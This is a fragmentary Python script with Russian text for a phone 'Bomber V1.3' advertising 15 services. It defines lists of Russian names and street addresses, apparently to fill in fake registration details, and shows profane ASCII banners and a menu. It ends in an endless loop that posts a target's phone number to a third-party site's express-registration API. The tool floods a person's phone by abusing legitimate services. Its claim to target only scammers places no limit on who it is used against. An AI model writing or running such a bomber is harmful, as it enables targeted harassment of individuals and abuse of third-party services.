...
n0 = ('Евгений', 'Елена', 'Екатерина', 'Наталья', 'Светлана' 'Олег' 'Егор', 'Дмитрий', 'Амир', 'Артем', 'Владислав', 'Эдуард', 'Никита')
nnf0 = ('Евгений Петрович', 'Евгений Алексеевич', 'Александра Эдуардовна', 'Наталья Андреевна', 'Дмитрий Олегович', 'Эдуард Арсеньевич')
nf0 = ('Евгений Дорошев', 'Евгений Оловянников', 'Полина Дубкова', 'Дмитрий Собакин')
nff0 = (
    'Дорошев Евгений Петрович', 'Лисицына Елена Григорьевна', 'Печев Александр Романович', 'Собакин Дмитрий Алексеевич', 'Болочевский Арсений Иванович', 'Авилов Эдуард Николаевич', 'Шевченко Максим Петрович')
d0 = ('1', '1А', '2', '2А', '3', '3А', '4', '4А', '5', '5А', '6', '6А', '1Б', '1В', '2Б', '2В', '3Б', '3В', '4Б', '4В', '5Б', '5В', '6Б', '6В')
st0 = ('Народная', 'Серегина', 'Гагарина', 'Пр-кт Победы', 'Магистральный пр-д', 'Черняховского', 'Краснополянская', 'пр-кт Клыкова')
...
|MTS,ROSTE?    заеб 200%                 .RU,M А ROST|         0123456789
|ELECOM,DO! выполняет функции инквизиции 'OSTE К OM,D|         0123456789
|MTS,ROSTE   кредиотование (ну почти)    .RU,MTS,ROST|           | -|
...
try:
    ...
    Логи - 2
        ...
        Действие: ''')
    if chs == '1':
        print(Fore.GREEN + """Bomber V1.3 28.09.23; Доступно 15 сервисов

    Бомбер использует исключительно сервисы, вызывающие зуд в области афериста (звонки). 
...
{f.readline(1)}''')
            ...
            while True:
                try:
                    r = requests.post('https://bvbinfo.ru/api/v1/accounts/express_registration/', data={'phone': f'{p0}{p1}{p2}{p3}{p4}{p5}{p6}{p7}{p8}{p9}{p10}',
                                                                                                        'role': '3'},
                                      headers={})
